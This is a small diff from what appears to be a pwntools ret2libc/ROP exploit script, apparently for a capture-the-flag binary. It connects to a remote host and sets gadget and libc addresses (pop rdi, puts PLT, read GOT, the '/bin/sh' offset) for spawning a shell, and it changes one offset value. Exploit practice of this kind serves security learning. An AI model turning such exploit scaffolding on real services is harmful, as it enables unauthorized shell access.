@@ -15,7 +15,7 @@ yuan = remote(host,port)
 
 pop_rdi = 0x0000000000400923
 #bin_sh_libc = 0x18c58b
-bin_sh_libc = 0x18c177
+bin_sh_libc = 0x18cd17
 puts_plt = 0x400600
 read_GOT = 0x601038
 #read_libc = 0xf69a0
